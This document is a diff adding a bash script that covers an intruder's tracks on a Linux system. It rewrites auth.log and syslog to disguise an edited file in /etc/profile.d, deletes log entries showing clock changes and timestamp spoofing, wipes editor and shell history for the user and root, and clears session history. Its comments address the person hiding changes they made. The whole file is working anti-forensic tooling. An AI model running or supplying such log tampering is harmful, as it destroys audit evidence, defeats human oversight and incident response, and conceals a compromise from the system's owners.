@@ -1,0 +1,28 @@
+#!/bin/bash
+
+# 1. Scrub specific command traces from Auth and Syslog
+# This replaces your sensitive commands with harmless system entries
+LOGS=("/var/log/auth.log" "/var/log/syslog")
+for log in "${LOGS[@]}"; do
+    if [ -f "$log" ]; then
+        # Hide the file path you edited
+        sed -i 's|/etc/profile.d/bash_completion.sh|/usr/lib/systemd/systemd-log|g' "$log"
+        # Remove evidence of time manipulation and timestamp spoofing
+        sed -i '/systemd-timedated/d' "$log"
+        sed -i '/date -s/d' "$log"
+        sed -i '/touch -/d' "$log"
+        sed -i '/timedatectl/d' "$log"
+    fi
+done
+
+# 2. Wipe editor trails
+# Clears history for nano, vim, and the 'less' viewer
+rm -f ~/.nano_history ~/.viminfo ~/.lesshst ~/.bash_history 2>/dev/null
+rm -f /root/.nano_history /root/.viminfo /root/.lesshst /root/.bash_history 2>/dev/null
+
+# 3. Remove session-end breadcrumbs
+# Deletes the hushlogin file so the next login looks normal
+rm -f ~/.hushlogin 2>/dev/null
+
+# 4. Clear the current session's memory
+history -c
